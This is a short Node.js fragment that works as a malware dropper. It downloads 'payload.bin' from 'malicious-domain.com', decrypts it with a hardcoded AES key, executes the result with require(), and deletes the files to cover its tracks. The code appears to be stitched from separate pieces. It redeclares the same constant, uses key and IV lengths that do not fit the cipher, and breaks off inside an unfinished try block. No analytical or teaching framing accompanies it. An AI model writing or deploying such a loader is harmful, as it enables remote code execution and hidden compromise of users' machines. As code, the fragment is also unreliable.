const https = require('https');
const fs = require('fs');
const { exec } = require('child_process');

https.get('https://malicious-domain.com/payload.bin', (res) => {
  const file = fs.createWriteStream('payload.bin');
  res.pipe(file);
  file.on('finish', () => {
    file.close(() => {
      exec('node -r ./decryptor.js payload.bin', (err) => {
        if (!err) {
          fs.unlinkSync('payload.bin');
        }
      });
    });
  });
});

const crypto = require('crypto');
const fs = require('fs');

const encrypted = fs.readFileSync('payload.bin');
const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from('hardcodedkey'), Buffer.from('ivvalue'));
let decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);
fs.writeFileSync('payload_decrypted.js', decrypted);
require('./payload_decrypted.js');
fs.unlinkSync('payload_decrypted.js');

const fs = require('fs');
try {
  fs.unlinkSync('payload.bin');
